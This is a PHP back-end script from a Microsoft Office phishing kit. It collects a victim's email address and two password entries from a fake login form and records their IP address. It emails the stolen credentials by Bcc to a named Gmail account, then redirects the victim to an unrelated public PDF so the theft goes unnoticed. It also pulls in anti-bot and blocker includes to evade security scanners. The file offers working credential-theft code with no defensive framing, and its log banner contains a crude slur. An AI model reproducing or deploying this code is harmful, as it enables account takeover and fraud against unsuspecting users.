<?php
session_start();
error_reporting(0);

$passwrd = $_POST['pass'];
$_SESSION['passwrd']=$passwrd;

include './lib/loca.php';
  include './lib/browser.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office Log ReSulT by-----------------------\n";
$message .= "Email       : ".$_POST['email']."\n";
$message .= "1STPASS]      : ".$_POST['pass']."\n";
$message .= "2NDPASS]      : ".$_POST['2passord']."\n";
$message .= "------------------------IP------------------------------\n";
$message .= "IP                :https://geoiptool.com/en/?ip=$ip\n";$IP=$_POST['IP'];
$message .= "--------------Office Log Created by Pussy----------------------\n";

$send = "";
$bcc="whitner101p@gmail.com" ;
$subject = "OFFICE 2019 IP :$ip\n";$IP=$_POST['IP'];
$headers .=$_POST['email']."\n";



mail($send, $subject, $message, "Bcc: $bcc");


header("Location: https://www.federalreserve.gov/releases/z1/20190307/z1.pdf");
?>
<meta http-equiv="refresh" content="0; URL=https://www.descartes.com/system/files/documents/u.s._foods_cs.pdf" />
